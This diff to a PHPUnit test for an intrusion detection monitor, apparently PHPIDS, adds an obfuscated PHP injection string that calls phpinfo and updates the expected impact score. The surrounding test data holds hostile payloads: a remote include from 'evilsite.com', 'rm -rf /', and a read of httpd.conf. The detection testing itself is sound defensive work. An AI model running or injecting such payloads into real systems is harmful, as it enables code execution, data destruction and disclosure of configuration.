@@ -638,6 +638,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))';
         $exploits[] = '; include "http://evilsite.com/evilcode"';
         $exploits[] = '; rm -rf /\0';
+        $exploits[] = '"; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="';
         
         $test = new IDS_Monitor(
             $exploits,
@@ -645,7 +646,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(76, $result->getImpact());       
+        $this->assertEquals(83, $result->getImpact());       
     }
 
     public function testDecimalCCConverter() {
